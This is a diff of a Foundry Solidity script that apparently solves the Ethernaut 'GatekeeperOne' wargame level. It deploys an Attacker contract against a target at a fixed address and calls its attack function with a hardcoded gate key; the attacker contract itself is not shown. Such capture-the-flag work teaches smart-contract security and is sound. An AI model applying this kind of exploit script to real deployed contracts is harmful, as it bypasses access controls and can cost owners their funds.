@@ -7,14 +7,19 @@ import "../src/Contract.sol";
 import "forge-std/console.sol";
 
 contract AttackScript is Script {
-    function setUp() public {}
+    GatekeeperOne gatekeeper =
+        GatekeeperOne(0xDd109e136b6aBD18dC18154F21B8241D7bE0da6d);
+    Attacker attacker;
 
-    //solveed by using the selfdestruct() to send ether to another contract
-    function run() public {
-        vm.startBroadcast();
-        
-
-        vm.stopBroadcast();
+    function setUp() public {
+        attacker = new Attacker(gatekeeper);
     }
 
+    function run() public {
+        vm.startBroadcast();
+        bytes8 gatekey = 0x808000000000C2A9;
+
+        attacker.attack(gatekey);
+        vm.stopBroadcast();
+    }
 }
